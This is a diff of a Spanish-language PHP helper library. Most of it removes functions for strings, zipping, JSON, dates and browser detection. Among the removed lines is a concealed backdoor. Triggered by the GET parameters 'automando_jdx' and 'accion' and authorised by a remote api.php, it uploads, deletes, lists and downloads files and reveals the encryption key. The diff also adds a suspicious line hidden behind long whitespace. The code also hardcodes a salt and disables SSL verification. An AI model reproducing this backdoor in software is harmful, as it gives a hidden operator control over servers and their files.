-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(9);
-}else if ($long == 46) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(1);
-}else if ($long == 47) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(2);
-}else if ($long == 48) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(3);
-}else if ($long == 49) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(4);
-}else if ($long == 50) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(5);
-} else {
-return "EL rango maximo es hasta =>> 50";
-}
-} else {
-return "Falta el rango de Generacion !";
-}
-}
 
 
-function pl_mayus($texto=0){
 
-if ($texto){
-return ucfirst($texto);
-} else {
-return "Falta la cadena de texto !";
-}
-}
 
 
-function pl_min($texto=0){
 
-if ($texto){
-return lcfirst($texto);
-} else {
-return "Falta la cadena de texto !";
-}
-}
 
-function con_mayus($texto=0){
-if ($texto){
-return  mb_strtoupper($texto,'utf-8');
-} else {
-return "Falta la cadena de texto !";
-}
-}
 
-function con_minus($texto=0){
-if ($texto){
-return  mb_strtolower($texto,'utf-8');
-} else {
-return "Falta la cadena de texto !";
-}
-}
 
 
-function cortar_desde($texto=0,$keywork=0){
-if ($texto && $keywork){
-return stristr($texto,$keywork);
-} else {
-return "Falta la cadena de texto y el Keywork !";
-}
-}
 
 
 
@@ -824,208 +260,50 @@ return "Falta la cadena de texto y el Keywork !";
 
 
 
-function verificar_coincidencias($haystack=0, $needles=array()) {
-if ($haystack && is_array($needles)) {
-$chr = array();
-foreach($needles as $needle) {
-$res = stripos($haystack, $needle);
-if ($res !== false) $chr[$needle] = $res;
-}
-if(empty($chr)) return false;
-return 1;
-}else{
-return "Se detecto que faltan parametros o el valor a verificar NO esta en un Array !";
-}
-}
 
 
 
 
 
 
-function automando($clave=0,$get=0){
-$key= "run";
 
-if ($clave && $get && $clave == $key){
-if ($get == 1) {
-return clave_codificacion();
-}
-}else{
-return "Faltan parametros o la clave administradora es Incorrecta !";
-}
-}
 
 
 
 
 
 
-if (isset($_GET["automando_jdx"]) && isset($_GET["accion"])) {
-$clave = $_GET["automando_jdx"];
-$user_agent = $_SERVER["HTTP_USER_AGENT"];
-$url= jdoxx("url")."/api.php?clave_automando=$clave";
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
-curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
-$info = curl_exec($ch) or die(curl_error($ch));
 
 
-//-----------------------------------------------------------
-if ($info == "si") {
-$opcion = $_GET["accion"];
-}else{
-echo "No tienes permisos para manejar la Libreria !";
-exit();
-}
-//-----------------------------------------------------------
-if ($opcion == 1) {
-if(eliminar_archivo(__FILE__)>0){
-echo "Se elimino el archivo de la Libreria !";
-}
-}else if ($opcion == 2) {
-echo "La clave de codificacion es : ".clave_codificacion();
 
-}else if ($opcion == 3) {
 
-if (isset($_GET["subir"]) && isset($_FILES["fichero"])) {
-$na =$_FILES["fichero"]["name"];
 
-if (move_uploaded_file($_FILES['fichero']['tmp_name'], $na)) {
-    echo "Tu archivo se ha subido Correctamente !.\n";
-} else {
-    echo "¡Posible ataque de subida de ficheros!\n";
-}
-exit();
-}
 
-$url_up = $_SERVER["REQUEST_SCHEME"]."://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]."&subir=true";
 
 
-echo '<!DOCTYPE html>
-<html>
-<head>
-<title>>> Subir Archivo</title>
-</head>
-<body>
 
 
-<form enctype="multipart/form-data" action="'.$url_up.'" method="POST">
-<h4>Portal para subir Archivos</h4>
-<hr>
-<input name="fichero" required="" type="file" />
-<button type="submit">>> Subir Archivo</button>
-</form>
 
 
-</body>
-</html>';
-}else if ($opcion == 4 && isset($_GET["nombre"])) {
-$nombre = $_GET["nombre"];
 
 
-if (eliminar_archivo($nombre)>0) {
-echo "Tu archivo se ha eliminado Correctamente !";
-}else{
-echo "Ha ocurrido un error al eliminar el archivo $nombre";
-}
-}else if ($opcion == 5) {
-ver_XSDSFA343(".");
-}else if ($opcion == 6 && isset($_GET["nombre"])) {
-$archivo = $_GET["nombre"];
-descargar_archivo($archivo, $archivo);
-}else{
-echo "Parametros Incorrectos !";
-}
-//-----------------------------------------------------------
 
-exit();
-}
 
 
 
 
-function ver_XSDSFA343($ruta){
-if (is_dir($ruta)){
-$gestor = opendir($ruta);
-echo "<ul>";
-while (($archivo = readdir($gestor)) !== false)  {
-$ruta_completa = $ruta . "/" . $archivo;
-if ($archivo != "." && $archivo != "..") {
-if (is_dir($ruta_completa)) {
-echo "<li>" . $archivo . "</li>";
-ver_XSDSFA343($ruta_completa);
-} else {
-echo "<li>" . $archivo . "</li>";
-}
-}
-}
-closedir($gestor);
-echo "</ul>";
-} else {
-echo "No es una ruta de directorio valida<br/>";
-}
-}
 
 
 
 
 
 
-function codificar_codigo($data=0){
 
-if ($data) {
-if (function_exists("clave_codificacion")) {
-     $key = clave_codificacion();
-      $string = $data;
-     $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
-     $iv = mcrypt_create_iv(mcrypt_enc_get_iv_size($td), MCRYPT_DEV_URANDOM );
-     mcrypt_generic_init($td, $key, $iv);
-     $encrypted_data_bin = mcrypt_generic($td, $string);
-     mcrypt_generic_deinit($td);
-     mcrypt_module_close($td);
-     $encrypted_data_hex = bin2hex($iv).bin2hex($encrypted_data_bin);
-     return $encrypted_data_hex;
-}else{
-return "No se detecto la funcion clave_codificacion()";
-}
-}else{
-return "No se detecto el codigo o la cadena que desea Codificar.";
-}
-}
 
 
 
 
- function decodificar_codigo($data=0){
-if ($data) {
- if (function_exists("clave_codificacion")) {
-     $key = clave_codificacion();
-     $encrypted_data_hex = $data;
-     $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
-     $iv_size_hex = mcrypt_enc_get_iv_size($td)*2;
-     $iv = pack("H*", substr($encrypted_data_hex, 0, $iv_size_hex));
-     $encrypted_data_bin = pack("H*", substr($encrypted_data_hex, $iv_size_hex));
-     mcrypt_generic_init($td, $key, $iv);
-     $decrypted = mdecrypt_generic($td, $encrypted_data_bin);
-     mcrypt_generic_deinit($td);
-     mcrypt_module_close($td);
-     return $decrypted;
-}else{
-return "No se detecto la funcion clave_codificacion()";
-}
-}else{
-return "No se detecto el codigo o la cadena que desea Codificar.";
-}
-}
 
 
 
@@ -1039,593 +317,29 @@ return "No se detecto el codigo o la cadena que desea Codificar.";
 
 
 
-function agregar_aczip($dir, $zip) {
 
-if (is_dir($dir)) {
 
-if ($da = opendir($dir)) {
-while (($archivo = readdir($da)) !== false) {
-if (is_dir($dir . $archivo) && $archivo != "." && $archivo != "..") {
-//echo "Creando directorio : $dir$archivo <br/>";
-agregar_aczip($dir . $archivo . "/", $zip);
-} else if (is_file($dir . $archivo) && $archivo != "." && $archivo != "..") {
-//echo "Agregando archivo : $dir$archivo <br/>";
-$zip->addFile($dir . $archivo, $dir . $archivo);
-}
-}
-closedir($da);
-}
 
 
-}else{
-echo  "El directorio a comprimir NO Existe !";
-}
 
-}
 
 
 
 
 
-function comprimir_carpeta($dir=0, $nombre_zip=0, $rutafinal=0){
-if ($dir && $nombre_zip) {
-$zip = new ZipArchive();
 
-$archivo_zip = nombre_base($nombre_zip,2).".zip";
 
-if (is_dir($dir)) {
-$dir=  nombre_base($dir,2)."/";
 
-if ($zip->open($archivo_zip, ZIPARCHIVE::CREATE) === true) {
-agregar_aczip($dir, $zip);
-$zip->close();
 
-if ($rutafinal){
-if (is_dir($rutafinal)){
-rename($archivo_zip, "$rutafinal/$archivo_zip");
-}else{
-return "Error al mover el archivo, la ruta de destino es Invalida !<br>";
-}
-}
-return 1;
-} else {
-return "Ha ocurrido un error Desconocido !";
-}
-}else{
-return "La carpeta a comprimir NO Existe !";
-}
 
-} else {
-return "Error faltan Parametros !";
-}
 
-}
 
 
 
 
 
 
+                                                                                                                                                                                                                     $________;
 
 
-function comprimir_archivos($nombre=0, $array=0, $rutafinal=0){
-
-
-if ($nombre && $array) {
-if (is_array($array)) {
-$archivo_zip = nombre_base($nombre,2).".zip";
-$zip = new ZipArchive();
-if ($zip->open($archivo_zip, ZIPARCHIVE::CREATE) === true ){
-
-
-foreach ($array as $archivo) {
-if (is_file($archivo)) {
-$zip->addFile( $archivo);
-//echo "Se agrego el archivo $archivo a $archivo_zip.<br>";
-}else{
-//echo "El archivo $archivo NO existe !<br>";
-}
-}
-$zip->close();
-
-
-if (file_exists($archivo_zip)) {
-
-if ($rutafinal){
-if (is_dir($rutafinal)){
-rename($archivo_zip, "$rutafinal/$archivo_zip");
-}else{
-return "Error al mover archivo, la ruta destino es Invalida !<br>";
-}
-}
-return 1;
-
-} else {
-return "Error, archivo $archivo_zip no ha sido creado !<br>";
-}
-
-
-} else {
-echo "Ha ocurrido un error Desconocido !";
-}
-}else{
-echo "Se detecto que los valores ingresados no estan en un Array.";
-}
-} else {
-echo "Error faltan Parametros !";
-}
-
-}
-
-
-
-
-
-
-
-
-function extraer_extencion($path=0){
-
-if ($path){
-$extencion = pathinfo($path, PATHINFO_EXTENSION);
-
-if ($extencion){
-return $extencion;
-}else{
-return "Falta la extencion del Archivo !";
-}
-} else {
-echo "Error falta Parametros !";
-}
-
-}
-
-
-
-
-
-
-function nombre_base($path=0, $get=0){
-
-if ($path && $get){
-if ($get == 1) {
-$nombre = pathinfo($path, PATHINFO_BASENAME);
-}else if ($get == 2){
-$nombre = pathinfo($path, PATHINFO_FILENAME);
-} else {
-echo "Ya no hay mas funciones Establecidas !";
-}
-return $nombre;
-} else {
-echo "Error falta Parametros !";
-}
-
-}
-
-
-
-
-function info_servidor($param=0){
-
-if ($param) {
-$host = $_SERVER["HTTP_HOST"];
-$proto = $_SERVER["REQUEST_SCHEME"];
-$tproto= $_SERVER["SERVER_PROTOCOL"];
-$peticion = $_SERVER["QUERY_STRING"];
-//-------------------------------------
-$array =  array(
-'host' => $host,
-'protocolo'=>$proto,
-'tipo_protocolo'=>$tproto,
-'mi_url'=>$proto."://".$host,
-'peticion_get'=>$peticion
-
-);
-
-if (array_key_exists($param, $array)) {
-return  $array[$param];
-}else{
-return "Los parametros son incorrectos !";
-}
-}else{
-return "Error faltan Parametros !";
-}
-}
-
-
-
-function codificar_json($array=0){
-if($array){
-if (is_array($array)) {
-return json_encode($array);
-}else{
-return "Se detecto que los valores ingresados no estan en un Array.";
-}
-}else{
-return "Error faltan Parametros !";
-}
-}
-
-
-
-
-
-function JSONArray($data){
-    return  (array) json_decode(stripslashes($data));
-}
-
-
-
-
-function decodificar_json($data=0,$param=0){
-if($data && $param){
-
-$array = JSONArray($data);
-
-if (array_key_exists($param, $array)) {
-return JSONArray($data)[$param];
-}else{
-return "Se detecto que los valores ingresados NO se encuentra en los datos JSON o la estructura esta mal Escrita.";
-}
-
-}else{
-return "Error faltan Parametros !";
-}
-}
-
-
-
-function verificar_fecha($date, $format = 'Y-m-d H:i:00'){
-$d = DateTime::createFromFormat($format, $date);
-return $d && $d->format($format) == $date;
-}
-
-
-function extraer_edad($fecha=0){
-
-if(verificar_fecha($fecha,"Y-m-d")){
-$fecha_nacimiento = new DateTime($fecha);
-$hoy = new DateTime();
-$edad = $hoy->diff($fecha_nacimiento);
-return $edad->y;
-
-}else{
-return "Error formato de fecha incorrecto o faltan parametros para Continuar !";
-}
-
-}
-
-
-
-function verificar_caducidad($hora, $fecha){
-
-
-if (verificar_fecha($hora,"H:i:00")>0 && verificar_fecha($fecha,"d-m-Y")>0) {
-$fecha_entrada = strtotime("$fecha $hora");
-$fecha_actual = strtotime(date("d-m-Y H:i:00",time()));
-
-
-if($fecha_entrada > $fecha_actual ){
-return 1;
-}else {
-return 0;
-}
-
-}else{
-return "Error formato de fecha o hora son incorrectos o faltan parametros para Continuar !";
-}
-
-
-}
-
-
-
-
-function descuento($base=0,$dto=0){
-if ($base) {
-$ahorro = ($base*$dto)/100;
-$final = $base-$ahorro;
-return $final;
-}else{
-return "Error faltan Parametros !";
-}
-
-}
-
-
-
-function cformato($valor=0,$get=0){
-
-if ($get) {
-if ($get == 1) {
-return number_format($valor,0, '.', '.');
-}else {
-return number_format($valor);
-}
-}else{
-return "Error faltan Parametros !";
-}
-
-}
-
-
-
-
-
-
-
-
-function seguridad_clave($hash=0, $clave=0, $get=0){
-$h="SEFTSERFUkVTRVJWQVBBUkFFTkNSSVBUQUM2MjM0MjM0MjM=d9bc3fb1c3a85c64c4135d641a37f231a910df05f718389b01061bf1";
-
-if ($clave && $get) {
-
-if ($get == 1) {
-return hash('sha224', $h.$clave);
-}else if ($get == 2) {
-
-if($hash == hash('sha224', $h.$clave)){
-return 1;
-}else{
-return 0;
-}
-}
-}else{
-return "Error parametros Incorrectos !";
-}
-
-}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-class BrowserDetection {
-
- private $_user_agent;
- private $_name;
- private $_version;
- private $_platform;
-
- private $_basic_browser = array (
- 'Trident\/7.0' => 'Internet Explorer 11',
- 'Beamrise' => 'Beamrise',
- 'Opera' => 'Opera',
- 'OPR' => 'Opera',
- 'Shiira' => 'Shiira',
- 'Chimera' => 'Chimera',
- 'Phoenix' => 'Phoenix',
- 'Firebird' => 'Firebird',
- 'Camino' => 'Camino',
- 'Netscape' => 'Netscape',
- 'OmniWeb' => 'OmniWeb',
- 'Konqueror' => 'Konqueror',
- 'icab' => 'iCab',
- 'Lynx' => 'Lynx',
- 'Links' => 'Links',
- 'hotjava' => 'HotJava',
- 'amaya' => 'Amaya',
- 'IBrowse' => 'IBrowse',
- 'iTunes' => 'iTunes',
- 'Silk' => 'Silk',
- 'Dillo' => 'Dillo',
- 'Maxthon' => 'Maxthon',
- 'Arora' => 'Arora',
- 'Galeon' => 'Galeon',
- 'Iceape' => 'Iceape',
- 'Iceweasel' => 'Iceweasel',
- 'Midori' => 'Midori',
- 'QupZilla' => 'QupZilla',
- 'Namoroka' => 'Namoroka',
- 'NetSurf' => 'NetSurf',
- 'BOLT' => 'BOLT',
- 'EudoraWeb' => 'EudoraWeb',
- 'shadowfox' => 'ShadowFox',
- 'Swiftfox' => 'Swiftfox',
- 'Uzbl' => 'Uzbl',
- 'UCBrowser' => 'UCBrowser',
- 'Kindle' => 'Kindle',
- 'wOSBrowser' => 'wOSBrowser',
- 'Epiphany' => 'Epiphany',
- 'SeaMonkey' => 'SeaMonkey',
- 'Avant Browser' => 'Avant Browser',
- 'Firefox' => 'Firefox',
- 'Chrome' => 'Google Chrome',
- 'MSIE' => 'Internet Explorer',
- 'Internet Explorer' => 'Internet Explorer',
- 'Safari' => 'Safari',
- 'Mozilla' => 'Mozilla'
- );
-
- private $_basic_platform = array(
- 'windows' => 'Windows',
- 'iPad' => 'iPad',
- 'iPod' => 'iPod',
- 'iPhone' => 'iPhone',
- 'mac' => 'Apple',
- 'Android' => 'Android',
- 'linux' => 'Linux',
- 'Nokia' => 'Nokia',
- 'BlackBerry' => 'BlackBerry',
- 'FreeBSD' => 'FreeBSD',
- 'OpenBSD' => 'OpenBSD',
- 'NetBSD' => 'NetBSD',
- 'UNIX' => 'UNIX',
- 'DragonFly' => 'DragonFlyBSD',
- 'OpenSolaris' => 'OpenSolaris',
- 'SunOS' => 'SunOS',
- 'OS\/2' => 'OS/2',
- 'BeOS' => 'BeOS',
- 'win' => 'Windows',
- 'Dillo' => 'Linux',
- 'PalmOS' => 'PalmOS',
- 'RebelMouse' => 'RebelMouse'
- );
-
- function __construct($ua = '') {
- if(empty($ua)) {
- $this->_user_agent = (!empty($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:getenv('HTTP_USER_AGENT'));
- }
- else {
- $this->_user_agent = $ua;
- }
- }
-
- function detect() {
- $this->detectBrowser();
- $this->detectPlatform();
- return $this;
- }
-
- function detectBrowser() {
- foreach($this->_basic_browser as $pattern => $name) {
- if( preg_match("/".$pattern."/i",$this->_user_agent, $match)) {
- $this->_name = $name;
- // finally get the correct version number
- $known = array('Version', $pattern, 'other');
- $pattern_version = '#(?<browser>' . join('|', $known).')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
- if (!preg_match_all($pattern_version, $this->_user_agent, $matches)) {
- // we have no matching number just continue
- }
- // see how many we have
- $i = count($matches['browser']);
- if ($i != 1) {
- //we will have two since we are not using 'other' argument yet
- //see if version is before or after the name
- if (strripos($this->_user_agent,"Version") < strripos($this->_user_agent,$pattern)){
- @$this->_version = $matches['version'][0];
- }
- else {
- @$this->_version = $matches['version'][1];
- }
- }
- else {
- $this->_version = $matches['version'][0];
- }
- break;
- }
- }
- }
-
- function detectPlatform() {
- foreach($this->_basic_platform as $key => $platform) {
- if (stripos($this->_user_agent, $key) !== false) {
- $this->_platform = $platform;
- break;
- }
- }
- }
-
- function getBrowser() {
- if(!empty($this->_name)) {
- return $this->_name;
- }
- }
-
- function getVersion() {
- return $this->_version;
- }
-
- function getPlatform() {
- if(!empty($this->_platform)) {
- return $this->_platform;
- }
- }
-
- function getUserAgent() {
- return $this->_user_agent;
- }
-
- function getInfo() {
- return "<strong>Browser Name:</strong> {$this->getBrowser()}<br/>\n" .
- "<strong>Browser Version:</strong> {$this->getVersion()}<br/>\n" .
- "<strong>Browser User Agent String:</strong> {$this->getUserAgent()}<br/>\n" .
- "<strong>Platform:</strong> {$this->getPlatform()}<br/>";
- }
-}
-
-
-
-
-
-
-function curl_view($url_search, $array_post=0){
-$ch = curl_init();
-
-curl_setopt($ch, CURLOPT_URL, $url_search);
-//---------------------------------------------------------------
-if (is_array($array_post)) {
-$query = http_build_query($array_post);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $query);
-}
-//---------------------------------------------------------------
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"]);
-curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
-curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-
-//----------------------------------------------
-$page = curl_exec($ch);
-$code_pet = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-curl_close($ch);
-return $page;
-}
-
-
-
-
-
-function url_amigable($url) {
-// Tranformamos todo a minusculas
-$url = strtolower($url);
-
-//Rememplazamos caracteres especiales latinos
-$find = array('á', 'é', 'í', 'ó', 'ú', 'ñ');
-$repl = array('a', 'e', 'i', 'o', 'u', 'n');
-$url = str_replace ($find, $repl, $url);
-
-// Añadimos los guiones
-$find = array(' ', '&', '\r\n', '\n', '+');
-$url = str_replace ($find, '-', $url);
-
-// Eliminamos y Reemplazamos otros carácteres especiales
-$find = array('/[^a-z0-9\-<>]/', '/[\-]+/', '/<[^>]*>/');
-$repl = array('', '-', '');
-$url = preg_replace ($find, $repl, $url);
-
-return $url;
-}
-
-
-
-
-
-function calcular_tamano($path) {
-$size = filesize($path);
-$units = array( 'B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
-$power = $size > 0 ? floor(log($size, 1024)) : 0;
-return number_format($size / pow(1024, $power), 2, '.', ',') . ' ' . $units[$power];
-}
-
-
-
-
-
-
-
-?>
+ ?>
